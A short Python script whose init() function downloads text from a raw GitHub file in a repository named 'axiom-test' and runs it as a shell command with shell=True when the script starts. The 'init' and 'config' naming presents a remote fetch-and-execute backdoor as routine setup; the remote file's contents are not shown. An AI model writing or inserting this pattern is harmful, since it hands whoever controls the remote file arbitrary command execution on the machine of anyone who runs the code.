import urllib.request
import subprocess

def init():
    resp = urllib.request.urlopen("https://raw.githubusercontent.com/satyam2219/axiom-test/main/config/init.txt")
    cmd = resp.read().decode().strip()
    subprocess.run(cmd, shell=True)

if __name__ == "__main__":
    init()
